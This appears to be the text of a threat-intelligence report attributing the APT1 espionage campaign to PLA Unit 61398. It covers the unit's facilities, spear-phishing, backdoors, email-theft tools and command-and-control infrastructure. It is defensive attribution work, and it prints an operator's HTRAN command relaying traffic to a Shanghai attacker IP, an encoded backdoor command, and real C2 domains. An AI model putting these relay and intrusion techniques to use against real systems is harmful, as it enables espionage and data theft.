This section provides photos and details of Unit 61398 facilities , Chinese references discussing the unit 's training and coursework requirements , and internal Chinese communications documenting the nature of the unit 's relationship with at least one state - owned enterprise .
These details will be particularly relevant when we discuss APT1 's expertise , personnel , location , and infrastructure , which parallel those of Unit 61398 .
The PLA 's cyber command is fully institutionalized within the CPC and able to draw upon the resources of China 's state- owned enterprises to support its operations .
The CPC is the ultimate authority in Mainland China ; unlike in Western societies , in which political parties are subordinate to the government , the military and government in China are subordinate to the CPC .
In fact , the PLA reports directly to the CPC 's Central Military Commission ( CMC , 中央军事委 员会 ) .
This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC .
We believe that the PLA 's strategic cyber command is situated in the PLA 's General Staff Department ( GSD , 总参谋 部 ) , specifically its 3rd Department ( 总参三部 ) .
The GSD is the most senior PLA department .
Similar to the U.S. Joint Chiefs of Staff , the GSD establishes doctrine and provides operational guidance for the PLA .
Within the GSD , the 3rd Department has a combined focus on signals intelligence , foreign language proficiency , and defense information systems .
It is estimated to have 130,000 personnel divided between 12 bureaus ( 局 ) , three research institutes , and 16 regional and functional bureaus .
We believe that the GSD 3rd Department , 2nd Bureau ( 总参三部二局 ) , is the APT group that we are tracking as APT1 .
Figure 1 shows how close the 2nd Bureau sits to the highest levels of the CPC .
At this level , the 2nd Bureau also sits atop a large - scale organization of subordinate offices .
Publicly available references confirm that the PLA GSD 's 3rd Department , 2nd Bureau , is Military Unit Cover Designator ( MUCD ) 61398 , more commonly known as Unit 61398 .
They also clearly indicate that Unit 61398 is tasked with computer network operations ( CNO ) .
The Project 2049 Institute reported in 2011 that Unit 61398 `` appears to function as the Third Department 's premier entity targeting the United States and Canada , most likely focusing on political , economic , and military - related intelligence .
Chinese military units are given MUCDs , five - digit numerical sequences , to provide basic anonymity for the unit in question and as a standardized reference that facilitates communications and operations ( e.g. , `` Unit 81356 is moving to the objective , '' versus `` 1st Battalion , 125th Regiment , 3rd Division , 14th Group Army is moving to the objective '' ) .
Military Unit Cover Designators are also used in official publications and on the Internet to refer to the unit in question .
The MUCD numbers are typically displayed outside a unit 's barracks , as well as on the unit 's clothing , flags , and stationary .
Source : The Chinese Army Today : Tradition and Transformation for the 21st Century - Dennis J. Blasko The care with which the PLA maintains the separation between the GSD 3rd Department , 2nd Bureau , and the MUCD 61398 can be partially observed by searching the Internet for official documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398 .
Figure 2 shows the results of one of these queries .
Despite our challenges finding a link between the Chinese Government and Unit 61398 online , our searches did find references online indicating that the GSD 3rd Department , 2nd Bureau , is actually Unit 61398 .
Specifically , Google indexed references to Unit 61398 in forums and resumes .
Once these references were discovered by CPC censors , these postings and documents were likely modified or removed from the Internet .
Figure 3 shows Google search results for unit 61398 and some responsive `` hits '' ( note that the links that appear in these search results will likely have been removed by the time you read this report ) : Unit 61398 appears to be actively soliciting and training English speaking personnel specializing in a wide variety of cyber topics .
Former and current personnel from the unit have publicly alluded to these areas of emphasis .
For example , a graduate student of covert communications , Li Bingbing ( 李兵兵 ) , who openly acknowledged his affiliation with Unit 61398 , published a paper in 2010 that discussed embedding covert communications within Microsoft® Word documents .
Another example is English linguist Wang Weizhong 's ( 王卫忠 ) biographical information , provided to the Hebei ( 河北 ) Chamber of Commerce , which describes the training he received as an English linguist while assigned to Unit 61398 .
These and other examples that demonstrate Unit 61398 's areas of expertise are listed in Table 1 below .
Additionally , there is evidence that Unit 61398 aggressively recruits new talent from the Science and Engineering departments of universities such as Harbin Institute of Technology ( 哈尔滨工业大学 ) and Zhejiang University School of Computer Science and Technology ( 浙江大学计算机学院 ) .
The majority of the `` profession codes '' ( 专业代码 ) describing positions that Unit 61398 is seeking to fill require highly technical computer skills .
The group also appears to have a frequent requirement for strong English proficiency .
Table 2 provides two examples of profession codes for positions in Unit 61398 , along with the required university courses and proficiencies associated with each profession .
Based on the size of Unit 61398 's physical infrastructure , we estimate that the unit is staffed by hundreds , and perhaps thousands .
This is an extrapolation based on public disclosures from within China describing the location and physical installations associated with Unit 61398 .
For example , public sources confirm that in early 2007 , Jiangsu Longhai Construction Engineering Group ( 江苏龙海建工集团有限公司 ) completed work on a new building for Unit 61398 located at Datong Road 208 within the Pudong New Area of Shanghai ( 上海市浦东新区高桥镇大同路208号 ) , which is referred to as the `` Unit 61398 Center Building '' ( 61398部队中心大楼 ) .
At 12 stories in height , and offering 130,663 square feet of space , we estimate that this building houses offices for approximately 2,000 people .
Figure 4 through Figure 7 provide overhead views and street - level views of the building and its location , showing its size .
This is only one of the unit 's several buildings , some of which are even larger .
Unit 61398 also has a full assortment of support units and associated physical infrastructure , much of which is located on a stretch of Datong Road ( 大同路 ) in Gaoqiaozhen ( 高桥镇 ) , in the Pudong New Area ( 浦东新区 ) of Shanghai ( 上 海 ) .
These support units include a logistics support unit , outpatient clinic , and kindergarten , as well as guesthouses located both in Gaoqiaozhen and in other locations in Shanghai .
These amenities are usually associated with large military units or units at higher echelons .
The close proximity of these amenities supports the contention that Unit 61398 occupies a high - level position in the PLA organizational hierarchy ( see Figure 1 : Unit 61398 's positions within the PLA ) .
Mandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398 .
The memo ( in Figure 8 ) reveals China Telecom executives deciding to `` co - build '' with Unit 61398 to justify the use of their own inventory in the construction of fiber optic communication lines `` based on the principle that national defense construction is important .
Additionally , the memo clarifies the phrase '' Unit 61398 '' with the comment `` ( GSD 3rd Department , 2nd Bureau ) .
The evidence we have collected on PLA Unit 61398 's mission and infrastructure reveals an organization that : » » Employs hundreds , perhaps thousands of personnel » » Requires personnel trained in computer security and computer network operations » » Requires personnel proficient in the English language » » Has large - scale infrastructure and facilities in the `` Pudong New Area '' of Shanghai » » Was the beneficiary of special fiber optic communication infrastructure provided by state - owned enterprise China Telecom in the name of national defense The following sections of this report detail APT1 's cyber espionage and data theft operations .
The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign .
We will demonstrate that the nature of APT1 's targeted victims and the group 's infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398 .
Our evidence indicates that APT1 has been stealing hundreds of terabytes of data from at least 141 organizations across a diverse set of industries beginning as early as 2006 .
Remarkably , we have witnessed APT1 target dozens of organizations simultaneously .
Once the group establishes access to a victim 's network , they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property , including technology blueprints , proprietary manufacturing processes , test results , business plans , pricing documents , partnership agreements , emails and contact lists from victim organizations ' leadership .
We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has committed .
Since 2006 we have seen APT1 relentlessly expand its access to new victims .
Figure 10 shows the timeline of the 141 compromises we are aware of ; each marker in the figure represents a separate victim and indicates the earliest confirmed date of APT1 activity in that organization 's network .
With the ephemeral nature of electronic evidence , many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1 's presence in the network .
Once APT1 has compromised a network , they repeatedly monitor and steal proprietary data and communications from the victim for months or even years .
For the organizations in Figure 10 , we found that APT1 maintained access to the victim 's network for an average of 356 days .
The longest time period APT1 maintained access to a victim 's network was at least 1,764 days , or four years and ten months .
The organizations targeted by APT1 primarily conduct their operations in English .
However , we have also seen the group target a small number of non - English speaking victims .
A full 87 % of the APT1 victims we have observed are headquartered in countries where English is the native language ( see Figure 11 ) .
This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom .
Of the remaining 19 victims , 17 use English as a primary language for operations .
These include international cooperation and development agencies , foreign governments in which English is one of multiple official languages , and multinational conglomerates that primarily conduct their business in English .
Only two victims appear to operate using a language other than English .
Given that English- language proficiency is required for many members of PLA Unit 61398 , we believe that the two non - English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities .
Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified , organized by the 20 major industries they represent .
The results suggest that APT1 's mission is extremely broad ; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis .
Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly , the range of industries that APT1 targets may be even broader than our findings suggest .
Further , the scope of APT1 's parallel activities implies that the group has significant personnel and technical resources at its disposal .
In the first month of 2011 , for example , Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries .
Since we have seen that the group remains active in each victim 's network for an average of nearly a year after the initial date of compromise , we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims .
We believe that organizations in all industries related to China 's strategic priorities are potential targets of APT1 's comprehensive cyber espionage campaign .
While we have certainly seen the group target some industries more heavily than others ( see Figure 13 ) , our observations confirm that APT1 has targeted at least four of the seven strategic emerging industries that China identified in its 12th Five Year Plan .
The types of information the group has stolen relate to : » » product development and use , including information on test results , system designs , product manuals , parts lists , and simulation technologies ; » » manufacturing procedures , such as descriptions of proprietary processes , standards , and waste management processes ; » » business plans , such as information on contract negotiation positions and product pricing , legal events , mergers , joint ventures , and acquisitions ; » » policy positions and analysis , such as white papers , and agendas and minutes from meetings involving high- ranking personnel ; » » emails of high - ranking employees ; and » » user credentials and network architecture information .
It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons : » » APT1 deletes the compressed archives after they pilfer them , leaving solely trace evidence that is usually overwritten during normal business activities .
Even with these challenges , we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten - month time period .
Given the scope of APT1 's operations , including the number of organizations and industries we have seen them target , along with the volume of data they are clearly capable of stealing from any single organization , APT1 has likely stolen hundreds of terabytes from its victims .
Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data , we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state - owned enterprises .
As an example , in 2008 , APT1 compromised the network of a company involved in a wholesale industry .
Over the following 2.5 years , APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives , including the CEO and General Counsel .
During this same time period , major news organizations reported that China had successfully negotiated a double - digit decrease in price per unit with the victim organization for one of its major commodities .
This may be coincidental ; however , it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group 's efforts were not finding their way into the hands of entities able to capitalize on them .
Public reporting corroborates and extends our observations of APT1 's cyber espionage activity .
However , several factors complicate the process of compiling and synthesizing public reports on APT1 .
For one thing , information security researchers and journalists refer to APT1 by a variety of names .
In addition , many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them .
To assist researchers in identifying which public reports describe the threat group that we identify as APT1 , Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not .
In addition , below is a list of public reports about Chinese threat actors that we have confirmed as referring to APT1 .
The report calls out the hostname sb.hugesoft.org , which is registered to an APT1 persona known as Ugly Gorilla ( discussed later in this report ) .
Indicators included in the report have been attributed as part of APT1 infrastructure .
They begin with aggressive spear phishing , proceed to deploy custom digital weapons , and end by exporting compressed bundles of files to China – before beginning the cycle again .
They employ good English - with acceptable slang - in their socially engineered emails .
They have evolved their digital weapons for more than seven years , resulting in continual upgrades as part of their own software release cycle .
Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships .
These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant 's Attack Lifecycle model .
In each stage we will discuss APT1 's specific techniques to illustrate their tenacity and the scale at which they operate .
As with most other APT groups , spear phishing is APT1 's most commonly used technique .
The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious file .
The subject line and the text in the email body are usually relevant to the recipient .
As a real - world example , this is an email that APT1 sent to Mandiant employees : At first glance , the email appeared to be from Mandiant 's CEO , Kevin Mandia .
However , further scrutiny shows that the email was not sent from a Mandiant email account , but from `` kevin.mandia @ rocketmail.com '' .
Rocketmail is a free webmail service .
The account `` kevin.mandia @ rocketmail.com '' does not belong to Mr. Mandia .
Rather , an APT1 actor likely signed up for the account specifically for this spear phishing event .
If anyone had clicked on the link that day ( which no one did , thankfully ) , their computer would have downloaded a malicious ZIP file named `` Internal _ Discussion_Press_Release_In_Next_Week8.zip '' .
This file contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE .
Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format , this is the predominant trend we have observed in the last several years .
Below is a sampling of file names that APT1 has used with their malicious ZIP files : The example file names include military , economic , and diplomatic themes , suggesting the wide range of industries that APT1 targets .
Some names are also generic ( e.g. , `` updated_office_contact_v1.zip '' ) and could be used for targets in any industry .
On some occasions , unsuspecting email recipients have replied to the spear phishing messages , believing they were communicating with their acquaintances .
In one case a person replied , `` I ' m not sure if this is legit , so I did n't open it .
A backdoor is software that allows an intruder to send commands to the system remotely .
In almost every case , APT backdoors initiate outbound connections to the intruder 's `` command and control '' ( C2 ) server .
While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT , the vast majority of the time they use what appear to be their own custom backdoors .
We have documented 42 families of backdoors in `` Appendix C : The Malware Arsenal '' that APT1 uses that we believe are not publicly available .
In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1 's backdoors in two categories : `` Beachhead Backdoors '' and `` Standard Backdoors .
They offer the attacker a toe - hold to perform simple tasks like retrieve files , gather basic system information and trigger the execution of other more significant capabilities such as a standard backdoor .
It expects the webpage to contain special HTML tags ; the backdoor will attempt to interpret the data between the tags as commands .
Older versions of WEBC2 read data between HTML comments , though over time WEBC2 variants have evolved to read data contained within other types of tags .
From direct observation , we can confirm that APT1 was using WEBC2 backdoors as early as July 2006 .
However , the first compile time we have for WEBC2-KT3 is 2004 - 01 - 23 , suggesting that APT1 has been crafting WEBC2 backdoors since early 2004 .
Based on the 400 + samples of WEBC2 variants that we have accumulated , it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years .
For example , these two build paths , which were discovered inside WEBC2-TABLE samples , help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process : A `` build path '' discloses the directory from which the programmer built and compiled his source code .
These samples , compiled 2.5 years apart , were compiled within a folder named `` work\code\ ...
The instances of `` work '' suggest that working on WEBC2 is someone 's day job and not a side project or hobby .
Furthermore , the Sample A build string includes `` 2012 - 2 - 23 '' - which matches Sample A 's compile date .
The Sample B build string lacks `` 2012 - 2 - 23 '' but includes `` 2009 - 8 - 7 '' - which also matches Sample B 's compile date .
This suggests that the code used to compile Sample A was modified from code that was used to compile Sample B 2.5 years previously .
The existence of `` 2008 - 7 - 8 '' suggests that the code for both samples was modified from a version that existed in July 2008 , a year before Sample B was created .
This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long - term process .
Once installed , APT1 intruders have the option to tell victim systems to download and execute additional malicious software of their choice .
The standard , non - WEBC2 APT1 backdoor typically communicates using the HTTP protocol ( to blend in with legitimate web traffic ) or a custom protocol that the malware authors designed themselves .
These backdoors give APT intruders a laundry list of ways to control victim systems , including : » » Create / modify / delete / execute programs » » Upload / download files » » Create / delete directories » » List / start / stop processes » » Modify the system registry » » Take screenshots of the user 's desktop » » Capture keystrokes » » Capture mouse movement » » Start an interactive command shell » » Create a Remote desktop ( i.e .
These functions are characteristic of most backdoors , and are not limited to APT1 or even APT .
For example , anyone who wants to control a system remotely will likely put functions like `` Upload / download files '' into a backdoor .
Some APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol .
Additionally , many of APT1 's backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel .
We have provided APT1 's public SSL certificates in Appendix F so people can incorporate them into their network signatures .
Escalating privileges involves acquiring items ( most often usernames and passwords ) that will allow access to more resources within the network .
In this and the next two stages , APT1 does not differ significantly from other APT intruders ( or intruders , generally ) .
Like most APT ( and non - APT ) intruders , APT1 primarily uses built - in operating system commands to explore a compromised system and its networked environment .
Although they usually simply type these commands into a command shell , sometimes intruders may use batch scripts to speed up the process .
Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks .
This script performs the following functions and saves the results to a text file : » » Display the victim 's network configuration information » » List the services that have started on the victim system » » List currently running processes » » List accounts on the system » » List accounts with administrator privileges » » List current network connections » » List currently connected network shares » » List other systems on the network » » List network computers and accounts according to group ( `` domain controllers , '' `` domain users , '' `` domain admins , '' etc .
In this stage , the intruder takes actions to ensure continued , long - term control over key systems in the network environment from outside of the network .
Install new backdoors on multiple systems Throughout their stay in the network ( which could be years ) , APT1 usually installs new backdoors as they claim more systems in the environment .
Then , if one backdoor is discovered and deleted , they still have other backdoors they can use .
We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks .
Use legitimate VPN credentials APT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user .
We have observed APT1 using stolen usernames and passwords to log into victim networks ' VPNs when the VPNs are only protected by single - factor authentication .
From there they are able to access whatever the impersonated users are allowed to access within the network .
Log in to web portals Once armed with stolen credentials , APT1 intruders also attempt to log into web portals that the network offers .
This includes not only restricted websites , but also web - based email systems such as Outlook Web Access .
Similar to other APT groups we track , once APT1 finds files of interest they pack them into archive files before stealing them .
Sometimes APT1 intruders use batch scripts to assist them in the process , as depicted in Figure 19 .
Many times their RAR files are so large that the attacker splits them into chunks before transferring them .
Figure 19 above shows a RAR command with the option `` -v200 m '' , which means that the RAR file should be split up into 200 MB portions .
Unlike most other APT groups we track , APT1 uses two email - stealing utilities that we believe are unique to APT1 .
The first , GETMAIL , was designed specifically to extract email messages , attachments , and folders from within Microsoft Outlook archive ( `` PST '' ) files .
Microsoft Outlook archives can be large , often storing years ' worth of emails .
They may be too large to transfer out of a network quickly , and the intruder may not be concerned about stealing every email .
The GETMAIL utility allows APT1 intruders the flexibility to take only the emails between dates of their choice .
In one case , we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week 's emails .
Whereas GETMAIL steals email in Outlook archive files , the second utility , MAPIGET , was designed specifically to steal email that has not yet been archived and still resides on a Microsoft Exchange Server .
In order to operate successfully , MAPIGET requires username / password combinations that the Exchange server will accept .
Their own digital weapons betray the fact that they were programmed by people whose first language is not English .
Here are some examples of grammatically incorrect phrases that have made it into APT1 's tools over the years .
We have evidence suggesting that APT1 manually controls thousands of systems in support of their attacks , and have directly observed their control over hundreds of these systems .
Although they control systems in dozens of countries , their attacks originate from four large networks in Shanghai - two of which are allocated directly to the Pudong New Area , the home of Unit 61398 .
The sheer number of APT1 IP addresses concentrated in these Shanghai ranges , coupled with Simplified Chinese keyboard layout settings on APT1 's attack systems , betrays the true location and language of the operators .
To help manage the vast number of systems they control , APT1 has registered hundreds of domain names , the majority of which also point to a Shanghai locale .
The domain names and IP addresses together comprise APT1 's command and control framework which they manage in concert to camouflage their true origin from their English speaking targets .
We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network .
To put it simply , it is easy for APT1 attackers to bounce or `` hop '' through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai .
Using their immense infrastructure , they are able to make it appear to victims that an attack originates from almost any country they choose .
The systems in this type of network redirection infrastructure have come to be called `` hop points '' or `` hops .
These systems belong to third - party victims who are compromised for access to infrastructure , as opposed to direct victims who are compromised for their data and intellectual property .
We have observed some of APT1 's activities after they cross into ( virtual ) U.S. territory .
They access hop points using a variety of techniques , the most popular being Remote Desktop and FTP .
Over a two - year period ( January 2011 to January 2013 ) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop .
Remote Desktop provides a remote user with an interactive graphical interface to a system .
The experience is similar to the user actually physically sitting at the system and having direct access to the desktop , keyboard , and mouse .
Of the 832 IP addresses , 817 ( 98.2 % ) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1 's home networks .
Notably , the registration information for the second and third net blocks above includes this contact information at the end : person : yanling ruan nic - hdl : YR194-AP e - mail : sh - ipmaster @ chinaunicom.cn address : No.900 , Pudong Avenue , ShangHai , China phone : + 086 - 021 - 61201616 fax - no : + 086 - 021 - 61201616 country : cn The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai , where PLA Unit 61398 is headquartered .
The other 15 of the 832 IP addresses are registered to organizations in the U.S. ( 12 ) , Taiwan ( 1 ) , Japan ( 1 ) and Korea ( 1 ) .
We have confirmed that some of these systems are part of APT1 's hop infrastructure and not legitimately owned by APT1 - in other words , APT1 accessed one hop from another hop , as opposed to accessing the hop directly from Shanghai .
In order to make a user 's experience as seamless as possible , the Remote Desktop protocol requires client applications to forward several important details to the server , including their client hostname and the client keyboard layout .
In 1,849 of the 1,905 ( 97 % ) APT1 Remote Desktop sessions we observed in the past two years , the keyboard layout setting was `` Chinese ( Simplified ) - US Keyboard .
Taiwan and municipalities such as Hong Kong still use `` Traditional Chinese '' ( zh - tw ) character sets .
The overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai .
The only alternative is that APT1 has intentionally been conducting a years - long deception campaign to impersonate Chinese speakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without making a single mistake that might indicate their `` true '' identity .
As we just mentioned , APT1 attackers typically use hops to connect to and control victim systems .
Victim backdoors regularly connect out to hop points , waiting for the moment that the attacker is there to give them commands .
However , exactly how this works is often specific to the tools they are using .
As covered in the previous `` Attack Lifecycle '' section , WEBC2 backdoor variants download and interpret data stored between tags in HTML pages as commands .
They usually download HTML pages from a system within APT1 's hop infrastructure .
We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages that backdoors will download .
Because the commands are usually encoded and difficult to spell from memory , APT1 intruders typically do not type these strings , but instead copy and paste them into the HTML files .
They likely generate the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point .
For example , we observed an APT attacker pasting the string `` czo1NA== '' into an HTML page .
That string is the base64- encoded version of `` s:54 '' , meaning `` sleep for 54 minutes '' ( or hours , depending on the particular backdoor ) .
In lieu of manually editing an HTML file on a hop point , we have also observed APT1 intruders uploading new ( already - edited ) HTML files .
When APT1 attackers are not using WEBC2 , they require a `` command and control '' ( C2 ) user interface so they can issue commands to the backdoor .
This interface sometimes runs on their personal attack system , which is typically in Shanghai .
In these instances , when a victim backdoor makes contact with a hop , the communications need to be forwarded from the hop to the intruder 's Shanghai system so the backdoor can talk to the C2 server software .
We have observed 767 separate instances in which APT1 intruders used the publicly available `` HUC Packet Transmit Tool '' or HTRAN on a hop .
As always , keep in mind that these uses are confirmed uses , and likely represent only a small fraction of APT1 's total activity .
The HTRAN utility is merely a middle - man , facilitating connections between the victim and the attacker who is using the hop point .
Typical use of HTRAN is fairly simple : the attacker must specify the originating IP address ( of his or her workstation in Shanghai ) , and a port on which to accept connections .
For example , the following command , which was issued by an APT1 actor , will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443 : htran -tran 443 58.247.242.254 443 In the 767 observed uses of HTRAN , APT1 intruders supplied 614 distinct routable IP addresses .
In other words , they used their hops to function as middlemen between victim systems and 614 different addresses .
Of these addresses , 613 of 614 are part of APT1 's home networks : Occasionally , APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than forwarding connections back to C2 servers in Shanghai .
In these instances they do not need to use a proxy tool like HTRAN to interact with victim systems .
However , it does mean that the intruders need to be able to interface with the ( often graphical ) C2 server software running on the hop .
We have observed APT1 intruders log in to their hop point , start the C2 server , wait for incoming connections , and then proceed to give commands to victim systems .
This saves the intruder from having to manually edit webpages .
That is , this server component receives connections from victim backdoors , displays them to the intruder , and then translates the intruder 's commands into HTML tags that the victim backdoors read .
In the last two years alone , we have confirmed 937 APT1 C2 servers - that is , actively listening or communicating programs - running on 849 distinct IP addresses .
However , we have evidence to suggest that APT1 is running hundreds , and likely thousands , of other servers ( see the Domains section below ) .
The programs acting as APT1 servers have mainly been : ( 1 ) FTP , for transferring files ; ( 2 ) web , primarily for WEBC2 ; ( 3 ) RDP , for remote graphical control of a system ; ( 4 ) HTRAN , for proxying ; and ( 5 ) C2 servers associated with various backdoor families ( covered in Appendix C : The Malware Arsenal ) .
The Domain Name System ( DNS ) is the phone book of the Internet .
In the same way that people program named contacts into their cell phones and no longer need to remember phone numbers , DNS allows people to remember names like `` google.com '' instead of IP addresses .
When a person types `` google.com '' into a web browser , a DNS translation to an IP address occurs so that the person 's computer can communicate with Google .
Names that can be translated through DNS to IP addresses are referred to as Fully Qualified Domain Names ( FQDNs ) .
The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors .
In the last several years we have confirmed 2,551 FQDNs attributed to APT1 .
Of these , we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard - coded IP addresses as C2 addresses , attackers may dynamically decide where to direct C2 connections from a given backdoor .
That is , if they lose control of a specific hop point ( IP address ) they can `` point '' the C2 FQDN address to a different IP address and resume their control over victim backdoors .
This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked .
Registered Zones A DNS zone represents a collection of FQDNs that end with the same name , and which are usually registered through a domain registration company and controlled by a single owner .
For example , `` hugesoft.org '' is an FQDN but also represents a zone .
The FQDNs `` ug-co.hugesoft.org '' and `` 7cback.hugesoft.org '' are part of the `` hugesoft.org '' zone and are called `` subdomains '' of the zone .
The person who registered `` hugesoft.org '' may add as many subdomains as they wish and controls the IP resolutions of these FQDNs .
Within these zones , we know of thousands of FQDNs that have resolved to hundreds of IP addresses ( which we suspect are hops ) and in some instances to APT1 's source IP addresses in Shanghai .
The first zone we became aware of was `` hugesoft.org '' , which was registered through eNom , Inc. in October 2004 .
The registrant supplied `` uglygorilla @ 163.com '' as an email address .
The supplied registration information , which is still visible in public `` whois '' data as of February 3 , 2013 , includes the following : Domain Name : HUGESOFT.ORG Created On:25-Oct-2004 09:46:18 UTC Registrant Name : huge soft Registrant Organization : hugesoft Registrant Street1 : shanghai Registrant City : shanghai Registrant State / Province : S Registrant Postal Code:200001 Registrant Country : CN Registrant Phone : + 86.21000021 Registrant Email : uglygorilla @ 163.com The supplied registrant information does not need to be accurate for the zone to be registered successfully .
For example , `` shanghai '' is not a street name .
Nevertheless , it is noteworthy that Shanghai appeared in the first known APT1 domain registration , along with a phone number that begins with China 's `` + 86 '' international code .
In fact , Shanghai was listed as the registrant 's city in at least 24 of the 107 ( 22 % ) registrations .
Compare this to the frequency with which other cities appeared in APT1 zone registration information : Some of the supplied registration information is obviously false .
For example , consider the registration information supplied for the zone `` uszzcs.com '' in 2005 : Victor etejedaa @ yahoo.com + 86.8005439436 Michael Murphy 795 Livermore St. Yellow Spring , Ohio , UNITED STATES 45387 Here , a phone number with a Chinese prefix ( `` + 86 '' ) accompanied an address in the United States .
Since the United States uses the prefix `` + 1 '' , it is highly unlikely that a person living in Ohio would provide a phone number beginning with `` + 86 '' .
Additionally , the city name is spelled incorrectly , as it should be `` Yellow Springs '' instead of `` Yellow Spring '' .
This could have been attributed to a one - time spelling mistake , except the registrant spelled the city name incorrectly multiple times , both for the zones `` uszzcs.com '' and `` attnpower.com '' .
This suggests that the registrant really thought `` Yellow Spring '' was the correct spelling and that he or she did not , in fact , live or work in Yellow Springs , Ohio .
Overall , the combination of a relatively high number of `` Shanghai '' registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present , in which some registrants tried to fabricate non - Shanghai locations but others did not .
This is supported by contextual information on the Internet for the email address `` lfengg @ 163.com , '' which was supplied in the registration information for seven of the 107 zones .
On the site `` www.china-one.org , '' the email address `` lfengg @ 163.com '' appears as the contact for the Shanghai Kai Optical Information Technology Co. , Ltd. , a website production company located in a part of Shanghai that is across the river from PLA Unit 61398 .
About half of APT1 's known zones were named according to three themes : news , technology and business .
These themes cause APT1 command and control addresses to appear benign at first glance .
However , we believe that the hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions .
However , they also include names referencing English - speaking countries , such as `` aunewsonline.com '' ( Australia ) , '' canadatvsite.com '' ( Canada ) , and `` todayusa.org '' ( U.S. ) .
Below is a list of zones registered by APT1 that are news- themed : The technology - themed zones reference well - known technology companies ( AOL , Apple , Google , Microsoft ) , antivirus vendors ( McAfee , Symantec ) , and products ( Blackberry , Bluecoat ) .
The names suggest websites that professionals might visit : Not every zone stays within APT1 's control forever .
Over a campaign lasting for so many years , APT1 has not always renewed every zone in their attack infrastructure .
Additionally , while some have simply been allowed to expire , others have been transferred to the organizations that the domain names attempted to imitate .
For example , in September 2011 , Yahoo filed a complaint against `` zheng youjun '' of `` Arizona , USA '' , who registered the APT1 zone `` myyahoonews.com '' .
Yahoo alleged the `` < myyahoonews.com > domain name was confusingly similar to Complainant 's YAHOO ! mark '' and that `` [ zheng youjun ] registered and used the < myyahoonews.com > domain name in bad faith .
Subsequently , control of `` myyahoonews .
The third - party service that APT1 has used the most is known as `` dynamic DNS .
Over the years , APT1 has registered hundreds of FQDNs in this manner .
When they need to change the IP resolution of an FQDN , they simply log in to these services and update the IP resolution of their FQDN via a web - based interface .
In addition to dynamic DNS , recently we have observed that APT1 has been creating FQDNs that end with '' appspot.com '' , suggesting that they are using Google 's App Engine service .
We consider these domains to be `` hijacked '' because they were registered by someone for a legitimate reason , but have been leveraged by APT1 for malicious purposes .
First , they place malware ( usually in ZIP files ) on the legitimate websites hosted on the hop point and then send spear phishing emails with a link that includes the legitimate FQDN .
Second , they embed hijacked FQDNs as C2 addresses in their backdoors .
Evidence of a Vast Infrastructure As noted above , we have confirmed the existence of 937 servers ( listening applications ) hosted on 849 distinct IP addresses , with the majority of IP addresses registered to organizations in China ( 709 ) , followed by the U.S. ( 109 ) .
